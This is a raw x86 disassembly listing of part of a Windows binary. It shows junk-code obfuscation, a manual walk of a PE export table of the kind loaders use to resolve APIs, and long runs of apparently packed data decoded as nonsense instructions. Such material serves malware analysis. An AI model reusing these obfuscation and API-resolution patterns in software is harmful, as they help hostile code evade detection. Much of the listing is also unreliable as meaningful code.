  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	pop    DWORD PTR [esi+eiz*8-0x5]
  413e8e:	push   0x47
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e71
  413e98:	hlt    
  413e99:	push   ds
  413e9a:	cli    
  413e9b:	fst    DWORD PTR [ecx+0x2f6071c8]
  413ea1:	add    ebp,esp
  413ea3:	jmp    0x3688:0xf4235d83
  413eaa:	hlt    
  413eab:	cdq    
  413eac:	repnz test DWORD PTR [eax+0x5ebc2684],ebx
  413eb3:	adc    al,0xff
  413eb5:	push   0x882e925f
  413eba:	dec    edx
  413ebb:	out    0xe8,al
  413ebd:	or     ebx,DWORD PTR [edi]
  413ebf:	div    DWORD PTR [ebx]
  413ec1:	jecxz  0x413e43
  413ec3:	cpuid  
  413ec5:	lods   eax,DWORD PTR ds:[esi]
  413ec6:	dec    ebp
  413ec7:	imul   edi,DWORD PTR [esi-0x1e96dbe3],0xcd75403d
  413ed1:	xor    DWORD PTR [edi],ebp
  413ed3:	and    edx,DWORD PTR [ecx]
  413ed5:	cld    
  413ed6:	arpl   WORD PTR [edi],dx
  413ed8:	fst    st(6)
  413eda:	mov    esi,0xad3a30a5
  413edf:	fsub   QWORD PTR [edx]
  413ee1:	mov    BYTE PTR [esi+0x2f],0xb9
  413ee5:	mov    ds:0xe4172bcc,eax
  413eea:	adc    BYTE PTR ds:0x71ea728b,dh
  413ef0:	ficom  WORD PTR [edx]
  413ef2:	lock sub edx,DWORD PTR [edi]
  413ef5:	cmp    dl,al
  413ef7:	(bad)  
  413ef8:	jmp    0x413f0d
  413efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413efb:	or     bh,ah
  413efd:	adc    al,dl
  413eff:	add    al,0xdb
  413f01:	mov    eax,ds:0xba9e159a
  413f06:	sub    ah,BYTE PTR [ebx]
  413f08:	and    esp,DWORD PTR ss:[eax+0x59]
  413f0c:	sbb    eax,0xfd5372bc
  413f11:	std    
  413f12:	mul    DWORD PTR [ebp+0x18c1fd6b]
  413f18:	or     eax,DWORD PTR [edx]
  413f1a:	mov    ebp,0xc9b1abba
  413f1f:	repz test DWORD PTR [ebp+0x2a],esi
  413f23:	xchg   esi,eax
  413f24:	stc    
  413f25:	inc    eax
  413f26:	dec    ebx
  413f27:	add    eax,0x7b2595c7
  413f2c:	fsub   DWORD PTR [ebp+0x100fbc0]
  413f32:	mov    ah,0xd9
  413f34:	bound  edi,QWORD PTR [ebp-0x7a371ca]
  413f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f3b:	pushf  
  413f3c:	hlt    
  413f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f3e:	lds    esp,FWORD PTR [esi]
  413f40:	(bad)  
  413f41:	nop
  413f42:	repz out dx,eax
  413f44:	xchg   ebx,eax
  413f45:	test   BYTE PTR [esp+ebp*8],ah
  413f48:	cmc    
  413f49:	mov    BYTE PTR [ebp-0x2a900c31],bl
  413f4f:	test   eax,0xb5afe5c
  413f54:	pusha  
  413f55:	ficomp WORD PTR [ebx]
  413f57:	jbe    0x413f5f
  413f59:	sub    al,0xd2
  413f5b:	cmp    BYTE PTR [ebx-0x55],al
  413f5e:	sbb    dl,BYTE PTR [ebp-0x53]
  413f61:	xchg   esp,eax
  413f62:	icebp  
  413f63:	ja     0x413fab
  413f65:	push   es
  413f66:	jp     0x413f6d
  413f68:	push   DWORD PTR [eax+0x1a04390e]
  413f6e:	xor    BYTE PTR [eax-0x32],bh
  413f71:	lods   al,BYTE PTR ds:[esi]
  413f72:	les    eax,FWORD PTR [ebx]
  413f74:	push   eax
  413f75:	push   ds
  413f76:	jle    0x413fe5
  413f78:	pusha  
  413f79:	rol    ecx,0x5e
  413f7c:	inc    eax
  413f7d:	xor    DWORD PTR [eax+0x44220db8],ebx
  413f83:	push   esi
  413f84:	aad    0xa1
  413f86:	jge    0x413fac
  413f88:	ss sbb eax,0x935c20f6
  413f8e:	outs   dx,BYTE PTR ds:[esi]
  413f8f:	stc    
  413f90:	scas   eax,DWORD PTR es:[edi]
  413f91:	push   0x26caa913
  413f96:	sub    BYTE PTR [ebx-0x6c],ah
  413f99:	inc    edi
  413f9a:	stc    
  413f9b:	in     al,0xca
  413f9d:	addr16 ss adc ebx,eax
  413fa1:	or     cl,dh
  413fa3:	push   ss
  413fa4:	cmp    esi,edi
  413fa6:	fisttp QWORD PTR [ecx+0x7d60a69a]
  413fac:	pop    ds
  413fad:	sbb    BYTE PTR [ecx+esi*2],dh
  413fb0:	in     al,0x5e
  413fb2:	xchg   ebx,eax
  413fb3:	pop    eax
  413fb4:	jae    0x414002
  413fb6:	outs   dx,DWORD PTR ds:[esi]
  413fb7:	cmp    dh,ch
  413fb9:	cmp    al,0x59
  413fbb:	cmp    eax,0xc6c4b494
  413fc0:	add    al,0x17
  413fc2:	js     0x413f70
  413fc4:	stos   DWORD PTR es:[edi],eax
  413fc5:	and    ebx,DWORD PTR [edx]
  413fc7:	test   al,0x30
  413fc9:	dec    ebp
  413fca:	fild   QWORD PTR [edi-0x573c05d3]
  413fd0:	leave  
  413fd1:	shr    esp,1
  413fd3:	nop
  413fd4:	aam    0xae
  413fd6:	push   ds
  413fd7:	mov    esi,0xe5afa4fa
  413fdc:	mov    dh,0xeb
  413fde:	jns    0x413f64
  413fe0:	push   ebp
  413fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe2:	jg     0x413fa0
  413fe4:	adc    al,0xb1
  413fe6:	les    ebp,FWORD PTR [ebp+0x18]
  413fe9:	pop    DWORD PTR [edx]
  413feb:	and    DWORD PTR [ebx+0x2a],esp
  413fee:	bound  esp,QWORD PTR [esi-0x27648c31]
  413ff4:	aas    
  413ff5:	das    
  413ff6:	popa   
  413ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ff8:	and    esi,ebx
  413ffa:	(bad)  
  413ffb:	std    
  413ffc:	test   DWORD PTR [ebx-0x1996d3b8],ebp
  414002:	push   ebp
  414003:	xchg   ebx,eax
  414004:	ret    
  414005:	xchg   ebp,eax
  414006:	mov    eax,0x4c435421
  41400b:	repz addr16 xchg esi,eax
  41400e:	cmp    BYTE PTR ds:0x9b0edc7f,ch
  414014:	inc    eax
  414015:	pop    es
  414016:	ins    DWORD PTR es:[edi],dx
  414017:	les    esp,FWORD PTR [esi]
  414019:	data16 repz cld 
  41401c:	dec    edx
  41401d:	ss (bad) 
  41401f:	cmp    dh,ah
  414021:	sbb    BYTE PTR [esi+0x79ba0bc1],bh
  414027:	jl     0x414076
  414029:	outs   dx,BYTE PTR ds:[esi]
  41402a:	cmp    ah,al
  41402c:	jnp    0x414087
  41402e:	add    dl,BYTE PTR [ecx]
  414030:	cwde   
  414031:	dec    esi
  414032:	xchg   edi,eax
  414033:	jae    0x4140a6
  414035:	daa    
  414036:	jecxz  0x41405f
  414038:	lea    ecx,[ebp-0x2a]
  41403b:	sbb    eax,DWORD PTR [eax-0x663b6a61]
  414041:	and    eax,0xf47b88bd
  414046:	(bad)  
  414047:	sar    ebp,1
  414049:	or     al,0xfd
  41404b:	aaa    
  41404c:	mov    DWORD PTR [ecx+edi*8+0x68],ebp
  414050:	xchg   DWORD PTR [ebx+0x2f3e8aba],esp
  414056:	retf   
  414057:	bound  eax,QWORD PTR [esi]
  414059:	pop    ds
  41405a:	cld    
  41405b:	sbb    al,0x52
  41405d:	fcmovne st,st(4)
  41405f:	jl     0x41406e
  414061:	sub    edx,DWORD PTR [edi]
  414063:	(bad)  
  414064:	clc    
  414065:	xchg   BYTE PTR [esi+edi*4],dl
  414068:	test   BYTE PTR [eax],cl
  41406a:	(bad)  [edi]
  41406c:	jp     0x41401a
  41406e:	clc    
  41406f:	into   
  414070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414071:	int3   
  414072:	ror    DWORD PTR [ecx+eiz*8-0x77438657],1
  414079:	add    esi,DWORD PTR [ecx]
  41407b:	(bad)  
  41407c:	popf   
  41407d:	ja     0x414030
  41407f:	enter  0x647c,0xef
  414083:	pop    edi
  414084:	push   esp
  414085:	lahf   
  414086:	leave  
  414087:	out    dx,eax
  414088:	cwde   
  414089:	sub    ecx,edx
  41408b:	fdiv   st(2),st
  41408d:	inc    edx
  41408e:	pop    ss
  41408f:	aas    
  414090:	add    eax,0x482b521a
  414095:	les    ecx,FWORD PTR [eax+ebp*4-0x74]
  414099:	sbb    esi,eax
  41409b:	aas    
  41409c:	or     BYTE PTR [edi-0x40565afa],bl
  4140a2:	mov    eax,0x3839d369
  4140a7:	ds mov eax,0x9544d6ba
  4140ad:	hlt    
  4140ae:	cmp    ch,dh
  4140b0:	les    edx,FWORD PTR [eax+0x6d12bfd4]
  4140b6:	retf   0xe69d
  4140b9:	call   0xf687:0xa3cacb38
  4140c0:	jge    0x4140b9
  4140c2:	add    ebx,DWORD PTR [ebx+0x7740b697]
  4140c8:	sahf   
  4140c9:	outs   dx,BYTE PTR ds:[esi]
  4140ca:	sbb    edi,DWORD PTR [edx-0x25]
  4140cd:	mov    bh,0x2
  4140cf:	cli    
  4140d0:	jns    0x414059
  4140d2:	xor    BYTE PTR [esi],0xa9
  4140d5:	pushfw 
  4140d7:	test   edx,edx
  4140d9:	cmp    eax,0x54d8ea50
  4140de:	jne    0x414066
  4140e0:	or     al,0x7
  4140e2:	mov    BYTE PTR [edi-0x766d40e1],ch
  4140e8:	out    0x96,al
  4140ea:	std    
  4140eb:	and    DWORD PTR [esp+ebx*8+0x227a65a9],ebx
  4140f2:	sbb    eax,edx
  4140f4:	sbb    BYTE PTR [ebx],al
  4140f6:	mov    al,0xe2
  4140f8:	mov    eax,0xfa4b7592
  4140fd:	mov    cl,0xe8
  4140ff:	fstp   TBYTE PTR [edx+0x25]
  414102:	ss dec bp
  414105:	out    0xc7,al
  414107:	sub    DWORD PTR [ecx-0x40],0x66854cd9
  41410e:	sbb    dh,BYTE PTR [ebx]
  414110:	loope  0x414173
  414112:	sbb    eax,0xd00f7fb1
  414117:	pop    ebx
  414118:	mov    ebp,es
  41411a:	pusha  
  41411b:	push   ebp
  41411c:	popa   
  41411d:	cmp    al,0x49
  41411f:	call   0xd568:0x29197438
  414126:	jle    0x4140f3
  414128:	js     0x41410d
  41412a:	or     BYTE PTR [edx],0xae
  41412d:	dec    ecx
  41412e:	pushf  
  41412f:	mov    ecx,0x637ba4b7
  414134:	(bad)  
  414135:	mov    ecx,0x27f2270e
  41413a:	push   esp
  41413b:	adc    ebx,DWORD PTR [ecx]
  41413d:	ret    
  41413e:	xchg   esi,eax
  41413f:	in     eax,dx
  414140:	les    ebx,FWORD PTR [esi-0x3283215]
  414146:	sbb    eax,0xd68648b3
  41414b:	sbb    ch,BYTE PTR [eax-0x3d14d463]
  414151:	imul   eax,DWORD PTR [ebx],0x28f65822
  414157:	and    BYTE PTR [edx-0x4afec0fc],cl
  41415d:	sub    cl,BYTE PTR [ebx+0x2581ec45]
  414163:	aad    0xfc
  414165:	inc    edx
  414166:	add    BYTE PTR [eax],al
  414168:	add    BYTE PTR [eax],al
  41416a:	add    BYTE PTR [ebx+0x42fcd50d],cl
  414170:	add    BYTE PTR [ecx-0x77],al
  414173:	or     eax,0x42fcd5
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41420d
  414283:	push   cs
  414284:	ja     0x414209
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0xa570707e
  41428f:	jno    0x414257
  414291:	mov    esp,0x7931c125
  414296:	neg    DWORD PTR [ebx+0x7b]
  414299:	imul   eax,DWORD PTR ds:0xc8c7ccc5,0x47
  4142a0:	(bad)  
  4142a1:	push   eax
  4142a2:	mov    dh,0x4b
  4142a4:	jmp    esi
  4142a6:	xor    eax,DWORD PTR ds:0xc67e89e4
  4142ac:	call   0xde3c:0x460f2393
  4142b3:	xchg   esi,eax
  4142b4:	aad    0xb3
  4142b6:	mov    al,ds:0xa28169c3
  4142bb:	(bad)  
  4142bc:	stc    
  4142bd:	sub    BYTE PTR [ebp+0x8d4cc6e],bh
  4142c3:	mov    ecx,0xe79d2589
  4142c8:	sub    DWORD PTR [eax+eiz*4-0x61],ebp
  4142cc:	jecxz  0x414335
  4142ce:	add    DWORD PTR [eax+0x790f97e2],esi
  4142d4:	lods   al,BYTE PTR ds:[esi]
  4142d5:	cmp    esi,esp
  4142d7:	pusha  
  4142d8:	push   esi
  4142d9:	push   esp
  4142da:	sbb    BYTE PTR [esi+eiz*4-0x4a936bf0],bl
  4142e1:	pop    esi
  4142e2:	adc    al,0x33
  4142e4:	stos   DWORD PTR es:[edi],eax
  4142e5:	jl     0x414301
  4142e7:	shr    dh,0xac
  4142ea:	dec    ebp
  4142eb:	lds    edx,FWORD PTR [ecx]
  4142ed:	sub    eax,0xe782a37f
  4142f2:	jae    0x4142f2
  4142f4:	mov    al,0x6e
  4142f6:	clc    
  4142f7:	enter  0xa2a0,0x8
  4142fb:	jle    0x414352
  4142fd:	jo     0x41434f
  4142ff:	xor    BYTE PTR ds:0x2d1d2549,dl
  414305:	xchg   BYTE PTR [esi],bh
  414307:	repnz (bad) 
  414309:	sbb    DWORD PTR [edi-0x121cc8c3],esp
  41430f:	push   0x966908a6
  414314:	push   ds
  414315:	lock mov ecx,0x429e6db6
  41431b:	pop    ecx
  41431c:	xor    ebp,DWORD PTR [eax]
  41431e:	sub    bl,BYTE PTR [ecx]
  414320:	xor    DWORD PTR [edi-0x20e91b3f],eax
  414326:	xchg   ch,dh
  414328:	scas   eax,DWORD PTR es:[edi]
  414329:	out    dx,al
  41432a:	add    ecx,DWORD PTR [edi]
  41432c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432d:	lods   al,BYTE PTR ds:[esi]
  41432e:	pop    edi
  41432f:	pushf  
  414330:	or     al,0xb0
  414332:	call   0x2ab3948a
  414337:	inc    esi
  414338:	jge    0x41431c
  41433a:	in     al,dx
  41433b:	les    edx,FWORD PTR [ebx-0x57777f37]
  414341:	(bad)  
  414342:	jns    0x4142c5
  414344:	ins    BYTE PTR es:[edi],dx
  414345:	retf   0x7eee
  414348:	into   
  414349:	sbb    edi,eax
  41434b:	(bad)  
  41434c:	fadd   QWORD PTR [ebp+0x509df780]
  414352:	dec    esi
  414353:	inc    esi
  414354:	xor    edi,ebp
  414356:	and    ebx,DWORD PTR [edi-0x7ef4b47a]
  41435c:	es das 
  41435e:	xchg   edx,eax
  41435f:	and    edi,eax
  414361:	jbe    0x41431f
  414363:	(bad)  
  414364:	pop    edi
  414365:	retf   0x3c84
  414368:	inc    esi
  414369:	xchg   edi,eax
  41436a:	jecxz  0x41434a
  41436c:	sub    dl,BYTE PTR [esi+ebx*8+0x1b]
  414370:	adc    DWORD PTR [edi],esi
  414372:	mov    ds:0xdf5961a5,eax
  414377:	jns    0x414374
  414379:	sub    DWORD PTR [ecx-0x7f],ebp
  41437c:	mov    ebx,0xce94747
  414381:	mov    al,0xca
  414383:	mov    ch,0x31
  414385:	popf   
  414386:	xor    al,BYTE PTR [esi]
  414388:	std    
  414389:	scas   al,BYTE PTR es:[edi]
  41438a:	mov    cl,0x1b
  41438c:	ins    DWORD PTR es:[edi],dx
  41438d:	mov    cl,0x6d
  41438f:	sbb    al,0x43
  414391:	ror    BYTE PTR [ebp-0x69],0x70
  414395:	xor    dl,al
  414397:	lods   al,BYTE PTR ds:[esi]
  414398:	lds    edi,FWORD PTR [eax]
  41439a:	jbe    0x4143d9
  41439c:	and    DWORD PTR [eax+0x1bc0cf90],0xffffff9d
  4143a3:	mov    ecx,0xf6836987
  4143a8:	sub    BYTE PTR [ebx+0x4c7cf883],dh
  4143ae:	mov    ss,WORD PTR [ebp+0x3a]
  4143b1:	out    0x4f,al
  4143b3:	call   FWORD PTR [esi-0x27]
  4143b6:	pop    edx
  4143b7:	daa    
  4143b8:	jg     0x414395
  4143ba:	cld    
  4143bb:	out    dx,al
  4143bc:	ror    DWORD PTR [esp+eiz*8-0x677f257d],0x99
  4143c4:	or     al,0xbb
  4143c6:	jle    0x414367
  4143c8:	jp     0x4143d2
  4143ca:	cmp    DWORD PTR [ebp+0x4ba3a373],ebx
  4143d0:	add    ah,dl
  4143d2:	jp     0x41438e
  4143d4:	mov    edi,0x30e18a86
  4143d9:	fwait
  4143da:	mov    al,0x4f
  4143dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143dd:	aaa    
  4143de:	ins    BYTE PTR es:[edi],dx
  4143df:	dec    esi
  4143e0:	pop    esp
  4143e1:	leave  
  4143e2:	push   edx
  4143e3:	push   esi
  4143e4:	repz cmp eax,0x70365184
  4143ea:	loopne 0x414428
  4143ec:	lea    esp,[esi-0x15418d14]
  4143f2:	int3   
  4143f3:	pop    ebp
  4143f4:	mul    DWORD PTR [esi+edx*8+0x58]
  4143f8:	adc    BYTE PTR [edx],bh
  4143fa:	iret   
  4143fb:	inc    esi
  4143fc:	adc    al,0x95
  4143fe:	cwde   
  4143ff:	sahf   
  414400:	(bad)  
  414401:	hlt    
  414402:	jb     0x414408
  414404:	jbe    0x4143f4
  414406:	xchg   ebp,eax
  414407:	aaa    
  414408:	push   0xffffffeb
  41440a:	jmp    DWORD PTR [eax-0x21d6ddea]
  414410:	loopne 0x414420
  414412:	mov    edx,0xa36daa9a
  414417:	dec    ebp
  414418:	es jp  0x41442e
  41441b:	inc    ebx
  41441c:	push   0x927fb972
  414421:	lea    esp,[edx]
  414423:	jne    0x4143ff
  414425:	stos   BYTE PTR es:[edi],al
  414426:	fwait
  414427:	mov    ah,0x1b
  414429:	imul   eax,DWORD PTR [edi-0x1d2975ff],0xbdd91b52
  414433:	and    ch,BYTE PTR [ebx]
  414435:	mov    ebx,0x948239e5
  41443a:	jno    0x414468
  41443c:	inc    edi
  41443d:	push   edi
  41443e:	hlt    
  41443f:	jl     0x41444a
  414441:	or     dh,BYTE PTR [edx]
  414443:	jo     0x414467
  414445:	pop    esp
  414446:	mov    bh,0x21
  414448:	inc    esi
  414449:	dec    edi
  41444a:	leave  
  41444b:	mov    WORD PTR [ebp+0x7598bffe],es
  414451:	mov    bl,0x76
  414453:	xchg   ecx,eax
  414454:	dec    esi
  414455:	mov    ds:0x6e0e59d8,al
  41445a:	call   0x9da:0x7ddb7018
  414461:	push   ebx
  414462:	jo     0x4144a5
  414464:	xchg   ch,dl
  414466:	fld    DWORD PTR [eax+0x44]
  414469:	and    edx,DWORD PTR [edi]
  41446b:	cmp    bh,BYTE PTR [ecx+0x6d87fa86]
  414471:	push   es
  414472:	mov    ah,0xf
  414474:	mov    bh,0x1e
  414476:	mul    ebx
  414478:	push   0xdd1267f9
  41447d:	mov    edx,0xafecabf1
  414482:	test   BYTE PTR [esi+0x1b9aed0],dh
  414488:	shl    bl,0x1b
  41448b:	bound  edx,QWORD PTR [esi]
  41448d:	mov    bl,0x7e
  41448f:	or     eax,0xc41f598e
  414494:	or     eax,DWORD PTR [eax+0x6b272f9e]
  41449a:	xchg   DWORD PTR [esi+0x35],ebp
  41449d:	test   al,0x88
  41449f:	sbb    eax,0x1357efc2
  4144a4:	inc    eax
  4144a5:	fld    DWORD PTR [edi+ebx*1]
  4144a8:	inc    ebp
  4144a9:	fwait
  4144aa:	dec    edx
  4144ab:	jg     0x41444e
  4144ad:	imul   ecx,DWORD PTR [esi-0x3f],0xffffffe9
  4144b1:	xor    al,0x33
  4144b3:	mov    ch,0x5b
  4144b5:	fbstp  TBYTE PTR [eax]
  4144b7:	sti    
  4144b8:	pop    edi
  4144b9:	cmp    al,0xe
  4144bb:	neg    ecx
  4144bd:	aaa    
  4144be:	push   ds
  4144bf:	int    0xc8
  4144c1:	mov    edx,0x99fc27e
  4144c6:	xchg   edx,eax
  4144c7:	(bad)  
  4144c9:	add    BYTE PTR [eax],dh
  4144cb:	stos   BYTE PTR es:[edi],al
  4144cc:	outs   dx,BYTE PTR ds:[esi]
  4144cd:	add    eax,0x92403ee0
  4144d2:	push   eax
  4144d3:	mov    esp,0x8bccd857
  4144d8:	popa   
  4144d9:	add    al,0xb7
  4144db:	in     eax,dx
  4144dc:	jae    0x414541
  4144de:	icebp  
  4144df:	inc    DWORD PTR [eax+0x6d3e1a30]
  4144e5:	lock lock xchg esi,eax
  4144e8:	and    eax,0x83f63eca
  4144ed:	jae    0x4144cd
  4144ef:	ja     0x4144cf
  4144f1:	test   eax,0xa2e4e811
  4144f6:	pop    esi
  4144f7:	mov    ds:0xafa58a52,eax
  4144fc:	test   edi,eax
  4144fe:	mov    ebx,0x3e1ee65f
  414503:	popa   
  414504:	ror    dl,cl
  414506:	sub    bh,dh
  414508:	mov    ds:0x8e43dd4c,eax
  41450d:	ror    DWORD PTR [ebx+0x63],1
  414510:	sub    edx,DWORD PTR [ecx+0x18]
  414513:	sar    DWORD PTR [ebx+0x711878b4],0xf4
  41451a:	mov    eax,ds:0x6c70608f
  41451f:	xchg   ecx,eax
  414520:	ins    BYTE PTR es:[edi],dx
  414521:	repnz pop es
  414523:	xor    al,0x35
  414525:	xchg   edi,eax
  414526:	push   0xffffffa0
  414528:	mov    ecx,0x4a99b086
  41452d:	mov    eax,0x4322ba52
  414532:	add    al,0x3a
  414534:	xchg   esp,eax
  414535:	fnstsw WORD PTR [ebx-0x26ec8f58]
  41453b:	sbb    al,0x90
  41453d:	shl    dh,cl
  41453f:	imul   ebp,DWORD PTR [eax-0x18],0x3e42139c
  414546:	dec    esp
  414547:	and    eax,0x1ec9fc1b
  41454c:	shl    DWORD PTR [ecx],1
  41454e:	fldenv [edx+edx*2]
  414551:	add    ch,BYTE PTR [ecx+esi*8-0x69]
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xa559beb4
  414576:	shl    BYTE PTR [ecx+0x707f70c9],0xb9
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145a3
  414581:	lds    edi,FWORD PTR [edx+edx*4-0x393389ee]
  414588:	sub    dh,dl
  41458a:	sub    edx,DWORD PTR [ebx+0x2b]
  41458d:	and    ch,al
  41458f:	push   cs
  414590:	push   esi
  414591:	cmp    al,0x8f
  414593:	sub    cl,BYTE PTR [ecx+eax*4]
  414596:	nop
  414597:	sbb    bl,BYTE PTR [ecx-0x64caa6dd]
  41459d:	loop   0x4145a5
  41459f:	or     ebx,ebp
  4145a1:	icebp  
  4145a2:	and    ebx,esp
  4145a4:	push   edx
  4145a5:	lahf   
  4145a6:	imul   DWORD PTR [edx+edx*8+0x72eb1d5]
  4145ad:	aas    
  4145ae:	cdq    
  4145af:	and    eax,0x5306be31
  4145b4:	fmul   st,st(4)
  4145b6:	retf   
  4145b7:	(bad)  
  4145b8:	xor    esi,DWORD PTR [esi+0x3358a910]
  4145be:	ja     0x414594
  4145c0:	mov    ch,0x18
  4145c2:	imul   eax,DWORD PTR [edi-0x5badf6b],0xde8248f6
  4145cc:	push   ebx
  4145cd:	push   ebx
  4145ce:	aas    
  4145cf:	repz aam 0x4e
  4145d2:	pop    ebx
  4145d3:	push   cs
  4145d4:	jmp    0x597e78f9
  4145d9:	aaa    
  4145da:	and    esp,edi
  4145dc:	ret    
  4145dd:	xchg   esi,eax
  4145de:	dec    ebp
  4145df:	fstp   QWORD PTR [edx]
  4145e1:	pop    es
  4145e2:	adc    esp,ebx
  4145e4:	not    DWORD PTR [ebx-0x48]
  4145e7:	inc    edi
  4145e8:	push   0x31
  4145ea:	push   ss
  4145eb:	(bad)  
  4145ec:	in     al,0x8b
  4145ee:	dec    edx
  4145ef:	and    ebx,eax
  4145f1:	inc    esi
  4145f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f3:	fnstenv [esi]
  4145f5:	js     0x414613
  4145f7:	mov    eax,ds:0x60de3bc6
  4145fc:	test   ah,bh
  4145fe:	and    eax,0xbabe0626
  414603:	aas    
  414604:	push   ebx
  414605:	xchg   esp,eax
  414606:	test   eax,0xd7d1c8ad
  41460b:	push   ecx
  41460c:	out    0xa4,al
  41460e:	dec    ebx
  41460f:	push   ecx
  414610:	int3   
  414611:	enter  0xadbc,0xb6
  414615:	inc    ebx
  414616:	mov    al,0x3a
  414618:	pop    ecx
  414619:	inc    esi
  41461a:	lods   eax,DWORD PTR ds:[esi]
  41461b:	jmp    0xb4812dda
  414620:	sbb    DWORD PTR [edi-0x6f],esp
  414623:	mov    WORD PTR [edx-0x48],es
  414626:	aas    
  414627:	call   0xba57:0x1e82ba18
  41462e:	jne    0x4145c5
  414630:	dec    edx
  414631:	lahf   
  414632:	sub    esi,DWORD PTR [ebx]
  414634:	pushf  
  414635:	pop    ecx
  414636:	push   ebx
  414637:	je     0x414622
  414639:	sub    DWORD PTR [ebx+edx*2-0xc],ebp
  41463d:	movd   mm1,DWORD PTR [ebx-0x4b]
